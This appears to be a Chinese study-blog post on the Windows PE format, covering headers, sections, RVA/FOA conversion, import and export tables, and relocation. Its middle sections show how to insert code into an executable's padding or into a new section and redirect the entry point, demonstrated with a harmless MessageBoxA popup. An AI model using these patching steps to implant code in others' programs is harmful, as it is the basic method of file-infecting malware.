<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注释掉的不需要重点分析</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0X00</span> WORD e_magic;      <span class="comment">//※Magic DOS signature MZ(4Dh 5Ah):MZ标记:用于标记是否是可执行文件</span></span><br><span class="line">    <span class="comment">//0X02 WORD e_cblp;     //Bytes on last page of file</span></span><br><span class="line">    <span class="comment">//0X04 WORD e_cp;       //Pages in file</span></span><br><span class="line">    <span class="comment">//0X06 WORD e_crlc;     //Relocations</span></span><br><span class="line">    <span class="comment">//0X08 WORD e_cparhdr;  //Size of header in paragraphs</span></span><br><span class="line">    <span class="comment">//0X0A WORD e_minalloc; //Minimun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0C WORD e_maxalloc; //Maximun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0E WORD e_ss;       //intial(relative)SS value</span></span><br><span class="line">    <span class="comment">//0X10 WORD e_sp;       //intial SP value</span></span><br><span class="line">    <span class="comment">//0X12 WORD e_csum;     //Checksum</span></span><br><span class="line">    <span class="comment">//0X14 WORD e_ip;       //intial IP value</span></span><br><span class="line">    <span class="comment">//0X16 WORD e_cs;       //intial(relative)CS value</span></span><br><span class="line">    <span class="comment">//0X18 WORD e_lfarlc;   //File Address of relocation table</span></span><br><span class="line">    <span class="comment">//0X1A WORD e_ovno;     //Overlay number</span></span><br><span class="line">    <span class="comment">//0x1C WORD e_res[4];   //Reserved words</span></span><br><span class="line">    <span class="comment">//0x24 WORD e_oemid;    //OEM identifier(for e_oeminfo)</span></span><br><span class="line">    <span class="comment">//0x26 WORD e_oeminfo;  //OEM information;e_oemid specific</span></span><br><span class="line">    <span class="comment">//0x28 WORD e_res2[10]; //Reserved words</span></span><br><span class="line">    <span class="comment">//0x3C DWORD e_lfanew;    //※Offset to start of PE header:定位PE文件，PE头相对于文件的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个结构体是16位的，但是现在的程序一般都运行在32位或64为的平台，但是有两个例外（标红的）。</p>
<p>两个红的还在使用，也就是这两个地方↓↓↓。除了这两个地方，其他的地方删了也不影响程序的正常运行。</p>
<p><img src="/2024/03/20/PE/image-20240321210416972.png" alt="image-20240321210416972"></p>
<h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS&#123;</span><br><span class="line">	DWORD Signature;		//PE头标识</span><br><span class="line">	IMAGE_FILE_HEADER FileHeader;	//标准PE头</span><br><span class="line">	IMAGE_OPTIONAL_HEADER32 OptionalHeader;		//扩展PE头</span><br><span class="line">&#125; IMAGE_NT_HEADER32,*PIMAGE_NT_HEADER32;</span><br></pre></td></tr></table></figure>

<p>PE标识：PE标识不能破坏，操作系统在启动一个程序的时候会检测这个标识</p>
<h3 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">	WORD Machine;					//可以运行在什么样的CPU上 任意：0  Intel368及以后：14C	x64:8664</span><br><span class="line">	WORD NumberOfSections;			//表示节的数量</span><br><span class="line">	DWORD TimeDateStamp;			//编译器填写的时间戳  与文件属性页面里面的创建时间、修改时间无关</span><br><span class="line">	DWORD PointerToSysbolTable;		//调试相关（不重要</span><br><span class="line">	DWROD NumberOfSys=mbols;		//调试相关（不重要</span><br><span class="line">	WORD SizeOfOptionalHeader;		//可选(扩展)PE头的大小(x32位PE文件：0xE0；x64PE文件：0xF0)</span><br><span class="line">    WORD Characteristics;			//文件属性</span><br><span class="line">&#125;	IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/20/PE/image-20240325192925364.png" alt="image-20240325192925364"></p>
<p>文件属性：</p>
<p><img src="/2024/03/20/PE/image-20240325153015448.png" alt="image-20240325153015448"></p>
<h3 id="扩展PE头"><a href="#扩展PE头" class="headerlink" title="扩展PE头"></a>扩展PE头</h3><p>32位的扩展PE头和64位的扩展PE头不太一样，这里只说32位的扩展PE头</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Magic; <span class="comment">// PE32：10B PE32+：20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion; <span class="comment">// 链接器版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion; <span class="comment">// 链接器版本号</span></span><br><span class="line">    DWORD   SizeOfCode; <span class="comment">// 所有代码节的总和（文件对齐后的大小），编译器填的（没用）</span></span><br><span class="line">    DWORD   SizeOfInitializedData; <span class="comment">// 包含所有已经初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用）</span></span><br><span class="line">    DWORD   SizeOfUninitializedData; <span class="comment">// 包含未初始化数据的节的总大小（文件对齐后的大小），编译器填的（没用）</span></span><br><span class="line">    DWORD   AddressOfEntryPoint; <span class="comment">// 程序入口</span></span><br><span class="line">    DWORD   BaseOfCode; <span class="comment">// 代码开始的基址，编译器填的（没用）</span></span><br><span class="line">    DWORD   BaseOfData; <span class="comment">// 数据开始的基址，编译器填的（没用）</span></span><br><span class="line">    DWORD   ImageBase; <span class="comment">// 内存镜像基址</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">// 内存对齐</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">// 文件对齐</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion; <span class="comment">// 标识操作系统版本号，主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion; <span class="comment">// 标识操作系统版本号，次版本号</span></span><br><span class="line">    WORD    MajorImageVersion; <span class="comment">// PE文件自身的版本号 </span></span><br><span class="line">    WORD    MinorImageVersion; <span class="comment">// PE文件自身的版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion; <span class="comment">// 运行所需子系统版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion; <span class="comment">// 运行所需子系统版本号</span></span><br><span class="line">    DWORD   Win32VersionValue; <span class="comment">// 子系统版本的值，必须为0</span></span><br><span class="line">    DWORD   SizeOfImage; <span class="comment">// 内存中整个PE文件的映射的尺寸，且是内存对齐的整数倍</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">// 所有头加节表按照文件对齐后的大小，否则加载会出错</span></span><br><span class="line">    DWORD   CheckSum; <span class="comment">// 校验和 两个字节两个字节相加，最后再加上文件长度，当两个字节相加时有溢出，让其自然溢出。最后相加得到的和就是校验和</span></span><br><span class="line">    WORD    Subsystem; <span class="comment">// 子系统，驱动程序(1)、图形界面(2) 、控制台/DLL(3)</span></span><br><span class="line">    WORD    DllCharacteristics; <span class="comment">// 文件特性 不是针对DLL的</span></span><br><span class="line">    DWORD   SizeOfStackReserve; <span class="comment">// 初始化时保留的栈大小 </span></span><br><span class="line">    DWORD   SizeOfStackCommit; <span class="comment">// 初始化时实际提交的大小 </span></span><br><span class="line">    DWORD   SizeOfHeapReserve; <span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit; <span class="comment">// 初始化时实践提交的大小 </span></span><br><span class="line">    DWORD   LoaderFlags; <span class="comment">// 调试相关</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes; <span class="comment">// 目录项数目</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">// 表，结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p><strong>Magic表示当前PE文件是32位还是64位</strong>，32位时该值对应0x10B，64位时该值对应0x20B。</p>
<p>其中的文件特性：拆分为二进制后对应的位：</p>
<img src="/2024/03/20/PE/image-20240326151008611.png" alt="image-20240326151008611" style="zoom:67%;">

<p><strong>AddressOfEntryPoint表示当前程序入口地址，</strong>这个成员与<strong>ImageBase</strong>相加才能得到真正的入口地址，成员<strong>ImageBase</strong>用来表示内存镜像基址，也就是PE文件在内存中按内存对齐展开后的首地址。</p>
<h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><img src="/2024/03/20/PE/image-20240326151849451.png" alt="image-20240326151849451" style="zoom:67%;">

<h4 id="节表数据结构说明"><a href="#节表数据结构说明" class="headerlink" title="节表数据结构说明"></a>节表数据结构说明</h4><p> 节表是一个结构体数组，每一个结构体描述一个节的信息。</p>
<img src="/2024/03/20/PE/image-20240326151949413.png" alt="image-20240326151949413" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME 8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// ASCII字符串（节名），可自定义，只截取8个字节，可以8个字节都是名字</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> <span class="comment">// Misc，双字，是该节在没有对齐前的真实尺寸，该值可以不准确</span></span><br><span class="line">        DWORD   PhysicalAddress; <span class="comment">// 真实宽度，这两个值是一个联合结构，可以使用其中的任何一个</span></span><br><span class="line">        DWORD   VirtualSize; <span class="comment">// 一般是取后一个</span></span><br><span class="line">    &#125; Misc;					</span><br><span class="line">    DWORD   VirtualAddress; <span class="comment">// 在内存中的偏移地址，加上ImageBase才是在内存中的真正地址</span></span><br><span class="line">    DWORD   SizeOfRawData; <span class="comment">// 节在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData; <span class="comment">// 节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations; <span class="comment">// 调试相关</span></span><br><span class="line">    DWORD   PointerToLinenumbers; <span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfRelocations; <span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfLinenumbers; <span class="comment">// 调试相关 </span></span><br><span class="line">    DWORD   Characteristics; <span class="comment">// 节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>代码中的注释可以大致了解到每个成员的作用，其中有2个成员来描述节的大小，分别是没有对齐前的真实尺寸和对齐后的宽度，这时候会出现一种情况就是对齐前的真实尺寸大于对齐后的宽度，<strong>这就是存在全局变量没有赋予初始值导致的，在文件存储中全局变量没有赋予初始值也就不占空间，但是在内存中是必须要赋予初始值的，这时候宽度就大了一些，</strong>所以在内存中节是谁大就按照谁去展开。</p>
<p><img src="/2024/03/20/PE/image-20240326202315229.png" alt="image-20240326202315229"></p>
<p>节的属性：将四个位全部展开后对应下表</p>
<p><img src="/2024/03/20/PE/image-20240326201156279.png" alt="image-20240326201156279"></p>
<h2 id="RVA与FOA的转换"><a href="#RVA与FOA的转换" class="headerlink" title="RVA与FOA的转换"></a>RVA与FOA的转换</h2><p>问题：如果想改变一个全局变量的初始值，该怎么做？</p>
<p>有初始值的全局变量和没有初始值的全局变量在PE文件中是不一样的。没有初始值的全局变量在PE文件中根本没有他的位置，只有在运行时内存展开后才会给他分配一个0；有初始值的全局变量的值是已经在PE文件中。</p>
<img src="/2024/03/20/PE/image-20240328143419116.png" alt="image-20240328143419116" style="zoom:67%;">

<p>这个地址是在内存展开后的地址，直接在PE文件中找这个地址肯定不行，因为PE文件静态和动态的地址肯定不一样。</p>
<img src="/2024/03/20/PE/image-20240328143817385.png" alt="image-20240328143817385" style="zoom:50%;">

<p>所以要把动态时的地址转换成PE文件静态地址。</p>
<p>这两种状态的地址相互转换，可以称为RVA与FOA的转换，<strong>RVA</strong>就是相对虚拟地址（Relative Virtual Address）（动态），<strong>FOA</strong>就是文件偏移地址（File Offset Address）（静态），FOA和内存无关，它是某个位置距离文件头的偏移。</p>
<p><img src="/2024/03/20/PE/image-20240328150556759.png" alt="image-20240328150556759"></p>
<ol>
<li>RVA地址由内存地址减去ImageBase地址（PE文件在内存中的开始位置是由扩展PE头中的ImageBase决定）；</li>
<li>判断RVA地址是否位于PE头中：<ol>
<li><strong>如果是，那么RVA等于FOA</strong>；</li>
<li><strong>如果不是，判断RVA位于哪个节：</strong><ol>
<li>当满足<strong>RVA地址大于等于节.VirtualAddress和RVA地址小雨等于节.VirtualAddress加上当前节内存对齐后的大小</strong>时，就表示RVA地址在该节中。</li>
<li>RVA地址减去节.VirtualAddress等于差值，<strong>FOA地址就是根据节.PointerToRawData加上差值</strong>。</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>在一些较老的编译器中，编译出来的文件会区分文件对齐、内存对齐，但是在现在的编译器编译出来的程序，文件对齐与内存对齐时完全一样的，所以我们不用费这么大的周折，我们只需要算出RVA的值就可以得出FOA的值。</p>
<h2 id="空白区添加代码"><a href="#空白区添加代码" class="headerlink" title="空白区添加代码"></a>空白区添加代码</h2><p>目标：打开程序时首先弹出一个窗口。</p>
<p>&lt;1&gt;构造要写入的代码<br>&lt;2&gt;在PE的空白区构造一段代码<br>&lt;3&gt;修改入口地址为新增代码位置<br>&lt;4&gt;新增代码执行后，跳回入口地址</p>
<p>构造要写入的代码，比如调用一个MessageBoxA。在VS中查看反汇编可以发现调用MessageBoxA的时候先有4个<code>push 0</code>，然后是一个调用。在编译器中看到的调用是间接调用，如果要写到PE文件中需要使用直接调用。</p>
<p>首先打开一个exe程序，查看一下MessageBoxA在内存中的地址。因为user32.dll中的地址是不会变的，所以直接拿过来就可以使用（同一台电脑一样，但是每台电脑不一样）。</p>
<p>使用<code>call</code>时，硬编码为<code>E8</code>，后面跟的地址应该是地址偏移。计算公式为<code>目标地址 - E8所在地址 - 5 = E8后面应该写的值</code>。</p>
<p>通过查询得MessageBoxA的地址为<code>751DA0E0</code>。</p>
<p>如果将E8写在0x3A8处，那么E8后面应该加的值为<code>751DA0E0 - 4003A8 - 5 = 74 DD 9D 33</code>。</p>
<img src="/2024/03/20/PE/image-20240330134830550.png" alt="image-20240330134830550" style="zoom:50%;">

<p>执行完这段代码之后，还要跳转回原先的程序入口。</p>
<p><img src="/2024/03/20/PE/image-20240330134931128.png" alt="image-20240330134931128"></p>
<p>在扩展PE头中查到这个地址是0x11023。所以还要计算E9后面跟的值。</p>
<p><code>0x411023 - 0x4003AD - 5 = 10C71</code></p>
<p>所以：<img src="/2024/03/20/PE/image-20240330135148603.png" alt="image-20240330135148603" style="zoom: 45%;"></p>
<p>这时添加的代码就完成了，最后还需要把文件开始执行的地址改成E8前面开始push的地址，也就是0x3A0。</p>
<p><img src="/2024/03/20/PE/3b7099b3a1cfc3c7826169ef678318f.png" alt="3b7099b3a1cfc3c7826169ef678318f"></p>
<h2 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h2><p>当我们需要插入的代码比较多时，如果只在节表后面的空白区域添加是不够的，所以可以在某一个节中添加，因此扩大一个节。</p>
<p>扩大节时，最好是扩大最后一个节，因为如果要扩大前面的节的话，后面每一个节的属性都需要修改。所以扩大最后一个节。</p>
<p>首先在文件的最后，插入需要的大小，比如扩大最后一个节0x1000(DEC:4096)</p>
<p><img src="/2024/03/20/PE/image-20240330160701699.png" alt="image-20240330160701699"></p>
<p>一个节表的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME ``8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; ``<span class="comment">// ASCII字符串（节名），可自定义，只截取8个字节，可以8个字节都是名字</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> ``<span class="comment">// Misc，双字，是该节在没有对齐前的真实尺寸，该值可以不准确</span></span><br><span class="line">        DWORD   PhysicalAddress; ``<span class="comment">// 真实宽度，这两个值是一个联合结构，可以使用其中的任何一个</span></span><br><span class="line">        DWORD   VirtualSize; ``<span class="comment">// 一般是取后一个</span></span><br><span class="line">    &#125; Misc;					</span><br><span class="line">    DWORD   VirtualAddress; ``<span class="comment">// 在内存中的偏移地址，加上ImageBase才是在内存中的真正地址</span></span><br><span class="line">    DWORD   SizeOfRawData; ``<span class="comment">// 节在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData; ``<span class="comment">// 节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations; ``<span class="comment">// 调试相关</span></span><br><span class="line">    DWORD   PointerToLinenumbers; ``<span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfRelocations; ``<span class="comment">// 调试相关 </span></span><br><span class="line">    WORD    NumberOfLinenumbers; ``<span class="comment">// 调试相关 </span></span><br><span class="line">    DWORD   Characteristics; ``<span class="comment">// 节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>想要扩大节就需要修改SizeOfRawData、VirtualSize。</p>
<p><img src="/2024/03/20/PE/image-20240330162850162.png" alt="image-20240330162850162"></p>
<p><img src="/2024/03/20/PE/image-20240330163011905.png" alt="image-20240330163011905"></p>
<h3 id="扩大节的步骤"><a href="#扩大节的步骤" class="headerlink" title="扩大节的步骤"></a>扩大节的步骤</h3><p>&lt;1&gt; 分配一块新的空间，大小为S</p>
<p>&lt;2&gt; 将最后一个节的SizeOfRawData和VirtualSize改成N</p>
<p>​		N &#x3D; （SizeOfRawData或者VirtualSize内存对齐后的值) + S			SizeOPfImageData和VirtualSize谁大选谁 </p>
<p>&lt;3&gt; 修改SizeOfImage大小</p>
<h2 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h2><p>扩大节时可能会影响扩大的最后一个节，因为修改了该节的属性，可能从只读变成可读可写，影响代码的执行。</p>
<h3 id="新增节的步骤"><a href="#新增节的步骤" class="headerlink" title="新增节的步骤"></a>新增节的步骤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt; 判断是否有足够的空间，可以增加一个新节表</span><br><span class="line"></span><br><span class="line">&lt;2&gt;在节表中新增一个成员</span><br><span class="line"></span><br><span class="line">&lt;3&gt;修改PE头中节的数量</span><br><span class="line"></span><br><span class="line">&lt;4&gt;修改SizeOfImage的大小</span><br><span class="line"></span><br><span class="line">&lt;5&gt;在原有数据的最后，新增一个节的数据（内存对齐的整数倍）</span><br><span class="line"></span><br><span class="line">&lt;6&gt;修正新增节表的属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="新增节-1"><a href="#新增节-1" class="headerlink" title="新增节"></a>新增节</h3><h4 id="有空间新增一个节表"><a href="#有空间新增一个节表" class="headerlink" title="有空间新增一个节表"></a>有空间新增一个节表</h4><img src="/2024/03/20/PE/image-20240408195256004.png" alt="image-20240408195256004" style="zoom:35%;">

<h4 id="复制一份节表"><a href="#复制一份节表" class="headerlink" title="复制一份节表"></a>复制一份节表</h4><p>可以复制一份.text节表，这个节表用来存储执行代码，不需要修改节的属性</p>
<p><img src="/2024/03/20/PE/image-20240408195702299.png" alt="image-20240408195702299"></p>
<p>加到后面，改一个名字</p>
<p>在标准PE头中，第二个成员是节的数量，本来有6个节，现在加一个节，改成7</p>
<p><img src="/2024/03/20/PE/image-20240408195808690.png" alt="image-20240408195808690"></p>
<p>为了方便添加节，还需要修改一下最后一个节表成员的属性，将其真实大小（VirtualSize）修改成文件对齐之后的大小（SizeOfRawData）：</p>
<p><img src="/2024/03/20/PE/image-20240409085156500.png" alt="image-20240409085156500"></p>
<p>接着修改添加的节表成员的属性：名字、真实大小（0x1000）、文件对齐之后的大小（0x1000）、内存中的偏移（第4个节的偏移地址0x74000+其数据大小0x4000）、文件中的偏移：</p>
<p><img src="/2024/03/20/PE/image-20240409085933456.png" alt="image-20240409085933456"></p>
<p>SizeOfImage + 0x1000</p>
<p><img src="/2024/03/20/PE/image-20240409091935619.png" alt="image-20240409091935619"></p>
<p>然后再文件最后插入0x1000的数据即可（4096字节）</p>
<p>这样新增节就完成了，然后可以在新增的节中增加要执行的代码</p>
<h2 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h2><p>上一章中了解到新增节需要在节表之后至少有40个字节的空白区给我们去新增，但并不是所有的程序都可以满足这个条件，如下图所示的程序在节表之后的数据是编译器填充的，这些数据并不能覆盖：</p>
<p><img src="/2024/03/20/PE/image2021-12-28_15-44-45.png" alt="images/download/attachments/1015828/image2021-12-28_15-44-45.png"></p>
<p>(视频看不了，见在线笔记)</p>
<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>一个可执行程序是由多个PE文件组成的，一个exe运行的时候，不仅有exe文件，还有一堆dll文件</p>
<p>exe中的<strong>导入表</strong>存储了这个程序需要用哪些dll</p>
<p><strong>导出表</strong>中存储了这个PE文件中的哪些函数需要提供给别人使用。</p>
<p>通常情况下，exe不提供函数给别人用，也就是一般没有导出表吗，但是不代表exe不能有导出表。</p>
<p>dll文件通常会调用其他函数，其他的exe或dll也会调用其中的函数，所以dll一般既有导出表，也有导入表。</p>
<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><p>找到PE头最后一个成员结构体数组，</p>
<p>然后找到该结构体数组的第一个结构体，里面包含了导出表的相对虚拟地址和导出表所占大小。</p>
<p><img src="/2024/03/20/PE/image-20240515143123896.png" alt="image-20240515143123896"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VirtualAddress：0x10000</span><br><span class="line">Size：0x7AE</span><br></pre></td></tr></table></figure>

<p>根据SectionAlign和FileAlign计算出导出表所在的位置</p>
<img src="/2024/03/20/PE/image-20240515150034086.png" alt="image-20240515150034086" style="zoom:50%;">

<p>然后就能找到导出表</p>
<img src="/2024/03/20/PE/image-20240515150229847.png" alt="image-20240515150229847" style="zoom:80%;">

<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><h3 id="导入表——确定依赖模块"><a href="#导入表——确定依赖模块" class="headerlink" title="导入表——确定依赖模块"></a>导入表——确定依赖模块</h3><p>和导出表一样，找到节表上面的结构体数组，找到第二个结构体成员。</p>
<p>因为打开的是一个exe，所以导出表是00 00 00 00（一般）</p>
<p><img src="/2024/03/20/PE/image-20240515222312319.png" alt="image-20240515222312319"></p>
<p>这里存储导入表RVA和Size：RVA-&gt;0x4BB74，Size-&gt;0x64</p>
<p>这个exe的SectionAlign和FileAlign不相同，所以先将RVA转换成FOA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SectionAlign：0x1000</span><br><span class="line">FileALign：0x200</span><br></pre></td></tr></table></figure>

<p>RVA：0x4BB74 -&gt; FOA：0x4AB74，VA：0x14004BB74</p>
<p><img src="/2024/03/20/PE/image-20240516083214817.png" alt="image-20240516083214817"></p>
<p>这个exe总共有4个依赖模块，最后由20个0结束。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B8 C0 04 00 00 00 00 00 00 00 00 00 0A C2 04 00 E0 D4 03 00</span><br><span class="line">D8 BB 04 00 00 00 00 00 00 00 00 00 2C C3 04 00 00 D0 03 00</span><br><span class="line">18 C1 04 00 00 00 00 00 00 00 00 00 A2 C3 04 00 40 D5 03 00</span><br><span class="line">48 BC 04 00 00 00 00 00 00 00 00 00 1A CA 04 00 70 D0 03 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>以下是导入表的结构，倒数第二个成员是一个字符串，存储的是依赖模块的地址，从这个RVA地址一直找到00结束</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        DWORD OriginalFirstThunk; ``<span class="comment">// RVA，指向IMAGE_THUNK_DATA结构数组</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD TimeDateStamp; ``<span class="comment">// 时间戳</span></span><br><span class="line">        DWORD ForwarderChain;</span><br><span class="line">    DWORD Name; ``<span class="comment">// RVA，表示依赖模块名字的地址，这是一串字符串</span></span><br><span class="line">        DWORD FirstThunk; ``<span class="comment">// RVA，指向IMAGE_THUNK_DATA结构数组</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/20/PE/image-20240516090158390.png" alt="image-20240516090158390"></p>
<p>所以，第一个依赖的模块就是USER32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090423249.png" alt="image-20240516090423249"></p>
<p>第二个模块是ADVAPI32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090556137.png" alt="image-20240516090556137"></p>
<p>第三个模块是ale32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090703665.png" alt="image-20240516090703665"></p>
<p>第四个模块是KERNEL32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090944739.png" alt="image-20240516090944739"></p>
<h3 id="导入表——确定依赖函数"><a href="#导入表——确定依赖函数" class="headerlink" title="导入表——确定依赖函数"></a>导入表——确定依赖函数</h3><p>在确定这个PE文件依赖那些导入表之外，还要确定这个PE文件依赖哪些函数。</p>
<p>在导入表结构体中，OriginalFirstThunk指向一个<strong>INT</strong>(Import Name Table)导入名称表，FirstThunk指向一个IAT(Import Address Table)导入地址表。</p>
<p><img src="/2024/03/20/PE/image-20240516091514313.png" alt="image-20240516091514313"></p>
<p>观察这两张表，这两张表指向不同的（地址不同）两张表，但是两者的内容一样。因此通过两个成员都能够找到当前所依赖模块中的函数。因此任选择一个成员去找依赖函数即可。</p>
<p>第一个成员指向的就是一个<strong>INT</strong>，结构体如下表，这个结构体中只有一个联合体，它的宽度就是四字节：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PBYTE ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal; ``<span class="comment">// 序号</span></span><br><span class="line">            PIMAGE_IMPORT_BY_NAME AddressOfData; ``<span class="comment">// 指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<p><strong>INT</strong>中有很多个这种结构体，他与导入表一样，当遇到与这个结构体宽度相同的一段0x00时，就代表这个表结束了。同时在这里面发现的结构体的数量就代表依赖模块的函数数量。</p>
<p><img src="/2024/03/20/PE/image-20240516152559528.png" alt="image-20240516152559528"></p>
<h3 id="导入表——确定依赖地址"><a href="#导入表——确定依赖地址" class="headerlink" title="导入表——确定依赖地址"></a>导入表——确定依赖地址</h3><p>在静态PE文件中，<strong>INT</strong>和<strong>IAT</strong>两张表的结构内容是一样的：</p>
<p><img src="/2024/03/20/PE/image-20240516202442765.png" alt="image-20240516202442765"></p>
<p>但是，当PE文件加载之后，IAT就发生了变化，它里面直接储存了函数的地址：</p>
<p><img src="/2024/03/20/PE/image-20240516202548298.png" alt="image-20240516202548298"></p>
<p>当程序在使用依赖模块的函数时，实际上是间接调用，比如调用MessageBoxA函数时，汇编指令不是直接call地址，而是从内存中找到这个地址再call：</p>
<p><img src="/2024/03/20/PE/image-20240516202749490-1720116192893-2.png" alt="image-20240516202749490"></p>
<p>而这一块内存就是IAT中存储的函数地址：</p>
<img src="/2024/03/20/PE/image-20240516202815003.png" alt="image-20240516202815003" style="zoom:50%;">

<p>为什么不只留一张表：因为IAT的函数地址很有可能被修改掉，导致地址不正确，如果只有一张表的话，就没有一个正确的参照物了。</p>
<h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>PE文件中最重要的三张表：导出表、导入表、重定位表</p>
<p>假设某个PE文件使用了一些模块，这些模块都有自己的ImageBase（内存中开始的地址），但实际上在内存中模块的ImageBase被别人占用了，<strong>这时候模块就需要偏移，换一个新的内存地址去展开，</strong>假设在这个模块中有很多已经写好了的地址硬编码（<strong>但凡涉及直接寻址的指令都需要进行重定位处理</strong>），当换了地址之后就找不到了，甚至会出现安全隐患，所以硬编码的地址是需要随着偏移而去修改的，<strong>这时候就需要一张表去记录需要修正的位置，便于去根据对应偏移修正，这张表就称为重定位表；</strong>一般来说，<strong>exe文件是没有重定位表的，</strong>因为他一般不会提供函数给别人用（导出表），所以运行时它理应是第一个载入内存中的，而DLL之类的PE文件则一定是需要重定位表的，因为它并不一定会加载在ImageBase上。</p>
<blockquote>
<p>当一个进程的内存空间中放进了一个A模块，占用了0x100000-0x1FFFFF的地址，但是本来B模块应该被放在这里，而这里已经被A模块占用，所以B模块只能放到A的后面，从0x200000开始。恰好B进程中有一个<code>x = 0x11</code>：</p>
</blockquote>
<blockquote>
<p><img src="/2024/03/20/PE/image-20240517150718844.png" alt="image-20240517150718844"></p>
</blockquote>
